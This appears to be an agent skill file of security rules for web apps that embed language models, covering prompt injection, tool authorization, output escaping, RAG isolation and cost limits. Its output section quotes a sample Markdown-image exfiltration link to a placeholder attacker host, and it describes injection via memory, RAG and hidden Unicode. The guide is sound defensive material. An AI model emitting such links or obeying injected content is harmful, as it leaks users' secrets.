---
name: ai-web-security
description: Security guidelines for web applications that use AI – chatbots, support assistants, RAG search, tool-using agents and MCP servers. Use when designing, implementing, reviewing or auditing any feature where a language model receives user input, reads external content, calls tools, or returns output that is rendered in a browser or passed to a backend. Based on OWASP Top 10 for LLM Applications 2026 and OWASP Top 10 for Agentic Applications 2026.
version: 1.1.0
updated: 2026-09-24
---

# AI Security for Web Applications

## Core principle

The language model is an **untrusted component**. Everything that reaches the model (user messages, documents, tool results, memory, images) may contain attacker instructions. Everything the model emits must be treated like input from an anonymous user. Security must come from **deterministic code around the model**, not from the system prompt.

## When to apply

- Adding or changing a chatbot, assistant, support widget, content generator or semantic search.
- Connecting a model to a database, API, email, files, payments, orders or a CMS.
- Implementing or integrating an MCP server/client, function calling or agents.
- Code review and pre-release audit of AI features.

## Agent workflow

1. **Map the architecture**: where model input comes from (trusted/untrusted sources), which tools the model has, where output goes (HTML, SQL, shell, email, another agent). Draw trust boundaries.
2. **Walk the checklist** in `references/review-checklist.md` – each item: pass / n/a / gap.
3. **For every gap** report: risk ID (e.g. `LLM01:2026`, `ASI02`), file and line, attack scenario, concrete code fix.
4. **Never accept** system prompt instructions ("do not reveal…", "ignore commands…") as a security control.
5. **Prioritize**: Critical (action/code execution, cross-user data leak, secrets in context) → High (XSS from model output, no cost limits, RAG without tenant isolation) → Medium → Low.

## Mandatory rules (MUST)

### Input and context – LLM01 Prompt Injection, LLM08 Hidden Context Exposure
- The system prompt is **static**. Never interpolate user, RAG or tool content into it.
- Pass untrusted content (documents, web pages, tool results, emails) in a clearly delimited data block, separate from instructions.
- **No secrets in model context**: API keys, passwords, connection strings, internal URLs, authorization rules. Assume the entire context can be disclosed to the user.
- Normalize input: strip zero-width chars, control chars, invisible Unicode (tags U+E0000–U+E007F, bidi overrides); cap message and history length.
- Long-term memory and RAG writes are persistent-infection vectors – validate and isolate them per user.

### Authorization and agency – LLM03 Excessive Agency, ASI02/ASI03
- Authorization is enforced **in backend code**, in the context of the authenticated user – never by the model.
- Minimal tool set, minimal tool functionality, minimal permissions (separate DB user with `SELECT` on required views only).
- No open-ended tools: arbitrary shell, arbitrary SQL, arbitrary URL fetch, arbitrary file write. Use narrow functions with strict parameter schemas validated server-side.
- Irreversible or financial actions (delete, payment, order change, sending email, permission change) require **human confirmation** showing the raw operation and parameters, not a model-generated summary.
- User/tenant identifiers come from the server session, never from model-generated arguments.

### Output – LLM10 Improper Output Handling
- Before display: **context-aware escaping**, or Markdown rendering through an allowlist sanitizer (e.g. DOMPurify). Never `innerHTML` with raw output.
- By default **disable auto-loading of Markdown images, iframes and link previews** – they are exfiltration channels (`![](https://evil.example/?d=SECRET)`). Images only from an allowlist or via a server-side proxy.
- Model output going to SQL – parameterized queries only. To shell – never. To `eval`, templates, deserialization – never.
- Strip ANSI sequences and control chars before writing to logs/terminals.
- Strict CSP (`script-src` without `unsafe-inline`, allowlisted `img-src`, restricted `connect-src`).

### Sensitive data – LLM02 Sensitive Information Disclosure
- **Authorize before retrieval**, do not filter after generation. RAG and tools return only records the user may access.
- Minimize data sent to the model provider (PII, customer data, payment data). Mask it when not required.
- Treat tool-call arguments, logs, telemetry, caches and error messages as leak channels too.
- Check provider terms/settings: data retention, training on data, processing region (GDPR).

### RAG and vectors – LLM09 Vector and Embedding Weaknesses
- Tenant/permission filter **inside the index query**, server-side; not as a post-filter.
- Separate indexes for content of different trust levels (public / internal / user-generated).
- Provenance for every chunk (source, date, pipeline version); delete embeddings when the source is deleted.
- Never return raw similarity scores to clients.

### Cost and availability – LLM06 Unbounded Consumption
- Limits per user/IP/key: requests, tokens per minute and per day, **hard spend cap** that halts inference.
- Input and output length limits (`max_tokens`), timeouts, cap on agent loop steps and tool calls.
- CAPTCHA/authentication for public chatbots; bot protection.

### Supply chain – LLM04, LLM05, ASI04
- Pinned versions of SDKs, libraries and models; checksum verification. MCP servers and skills only from trusted sources after code review.
- Model formats that cannot execute code (safetensors instead of pickle).
- AI inventory (AIBOM): models, providers, tools, MCP servers, credentials.

### Misinformation – LLM07 Misinformation
- Answers that drive decisions (prices, stock, order status, legal, health) come from system data, not model "knowledge". The model only phrases the answer from supplied facts.
- Clearly label AI-generated content (also an EU AI Act requirement for chatbots).

### Observability
- Log: user ID, session, tool calls with parameters, policy decisions, blocks, token usage. Do not log full secrets or unnecessary personal data.
- Alerts: cost spikes, repeated injection attempts, unusual tool sequences.

## Reference material

| File | Scope |
|---|---|
| `references/llm-chat-web.md` | Browser chat/assistant: architecture, frontend, backend proxy, streaming |
| `references/agents-tools-mcp.md` | Agents, function calling, MCP, OWASP Agentic Top 10 (ASI01–ASI10) |
| `references/rag-vectors.md` | RAG, embeddings, pgvector, document ingestion |
| `references/web-hardening.md` | Classic web security around AI features: headers, sessions, CSRF, CORS, rate limiting |
| `references/stack-perl-node.md` | Code patterns: Perl (Mojolicious/DBI/CGI), Node.js (Express/Fastify), PostgreSQL, MariaDB, Apache |
| `references/testing-redteam.md` | Security tests, prompt injection test cases, tools |
| `references/review-checklist.md` | Code review and pre-release audit checklist |
| `SOURCES.md` | Sources and verification dates |

## Review report format

```
## Summary
Architecture: <brief>. Result: X critical, Y high, Z medium.

## Findings
### [CRITICAL] <title> — LLM03:2026 / ASI02
Location: path/file.pm:120
Scenario: <how an attacker exploits it>
Fix: <concrete code or configuration change>

## Passed controls
<list>
```
